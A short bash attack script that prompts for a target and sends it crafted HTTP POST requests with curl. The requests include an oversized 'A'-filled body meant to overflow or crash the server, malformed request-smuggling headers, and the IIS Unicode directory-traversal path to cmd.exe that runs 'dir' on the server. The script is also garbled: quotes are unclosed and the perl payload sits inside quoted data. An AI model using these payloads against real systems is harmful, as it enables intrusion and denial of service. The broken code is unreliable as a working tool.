#!/bin/bash
echo -e "[ + ] Enter Target
read Target

curl -X POST -d ' / HTTP/1.1
Host: google.com
Connection: Keep-Alive
Content-Length: 49225 
perl -e 'print (A x 49255)
-i '$Target'


curl -X POST -d ' / HTTP/1.1
Host: google.com
Connection: Keep-Alive
Content-Length: 33
-i '$Target'


curl -X POST -d ' / HTTP/1.1
xxxx: POST /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.1
-i '$Target'

curl -X POST -d ' / HTTP/1.1
Connection: Keep-Alive
-i '$Target'
